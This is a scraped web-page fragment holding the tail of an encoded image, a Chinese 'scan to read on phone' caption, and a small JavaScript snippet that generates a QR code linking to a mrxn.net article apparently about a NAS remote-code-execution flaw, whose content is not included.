DN0/Y67JvPKsOYfYE+oZWROqTqHcsW+IT+JDcA/kQwbhxyg/fjcB9ZpB5NaEEJyumgOCkz4Le4Uzj3iIXtCjdAf0unor7BFqnQNqnfQ27IW1D6oOPLRxj4zA8RH/jNs35OEor1+8PRCIiQPlqwCOt6AQkyS/Jc4n1oO2J+MhnPgDHp/pWQ949Octcm2bZx/Me2Sfe0D4gf3T3tuH/Xr7hnzY1/HXPE7375D8lY2ulHVrI7RHaB3qtYTIpTvsy2gNzvlh7nOvs7h6Doh9oOKzvu4H65p9Q56d5A/r3V97PUmhn0V5G1AnDZGP/OYyulfm4LGHtNYH4YExqkbhOiGMvVB51ThUo/BaCOFV7pBH0a7FOSDqoKL9M9w3ZHYyF/F7IBcd/Gzb5Td1F0G9chC5r2VGCA16dK+MUH3uk3Xn1s4i1L7uscLcF6I2+61nDnqfdZhr7iWE8Cl37BviU/wQLN/UPaH8XNBP0D4IDcglR27PDA/TiT+A41/+MMfcBsI32te+lWbPDHOtPeYg9gYslf/zNHuERUwJUL7OfUPSwXxC2g0E6rT8gFA5iFzTdthnhPAApoboeiFQ3hKI3EXSZwHhBWw/jUC3p/fJTeCcL9e0OUSPzI/26gaSC74n311XJ7AHsjqdC7QyEDh3pXzNIPxAeWxrhbgnQPexcKenv91D2Jpg3Us1irZOa/EKqD3EtwGht/yztXq3MaqB6A8Vs68MJJM7v+4EykA83dGjWBNCTFa5A4KDQPMZc18IH1TM+pk893YOtR+M89zbdZk7m0P0tx9iDWO0z3sKR1wZiMWN157AHsi159/tXgYCcdU6R0Poqikg/DD+H4E1ZU+X6qnIRq0VmXMOdX+I3JpqHC3ndUZ7hZl3Ln4WZzy51n6heYjnB/Z/U7992K8v+WkvxIRHXxvMtZF/xEH08Bs1w1GtOeh7WHuGELXPfNah90Nw0KPrhOUjS4v/c/wtz74H8mGTLD9+P/tc/riAevXaWphr8rqHcgdEjddC6Dnxs3BfiDqof+GwlmshfJlb5RB+oNiA4ycRhZgk3n+EuWTfkHwaH5CXb+qe3OiZrAmtK383oH+r3Mv9hSNOfA6IXlBxpWfN/WFca699GVsNag/7oHIQueuEEJz9wn1DdDIfFHsgHzQMPUr5pg799YHg4GtRGyt0RR0w30NeBVSP1m24V8vP1hD9XJcx10D4YI4jf+ZWOdS++4asTuoCbflNPb8xZ/LR86/qoL4Z9uUe5oxZg6i1JoTgsq/NITxQ/0oMlYPIc516KzLnXPws7MkI0R/q/lnfNySfRpf/PNF9D4E6QTiXrx4bokf2QHD5zYKeyzXKs9+5+FXYN0KIPXO9fRAaVMy+NodzvrauXe8b0p7Ixes9kIsH0G5fBuKrehbbRrO1+410eO2aQ++Hyq32Gu1vznVCiH7KHfat0F7hn/jKQFZNtvZzJ9ANBOINgTGuHk1vRxsQfXJd69HaOoQfKlqTz2FuhPYIWx36vq1Ha3jdB7UGUJtToed0dAM51WGbvu0E9kC+7Wjfa3zJQIDjP+pAxfcef1wF877+aBC6GqpfvMJaRvEO815ntPYMoe4LkV8ykGcP+rfrq6/vSwcCMWWo6M2h50ZvVeacQ62Fx9weofdS7oBHP9S1/Rkh9MyN8rZ/9ljLnHOI/oCpB/zSgTx03ou3TmAP5K1j+76ibiC+bjNcPYprRh5rQutA+eYuXmFNCKGLnwWEByqq1uG6dm2+xZXPmhBiP9dDrAHJR1gTHsT9D+Wr6AZyr9m/LzyBMhCgvK3wPF89c34D/sTnPjB/HnuEq72swbwXYNsQgXJGNkBw2t/RaoCpIQKlbxnI0LnJHz+BPZAfP/L1hv8BAAD//5gubqAAAAAGSURBVAMAovmOmLDBXAwAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-login\_mgr-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 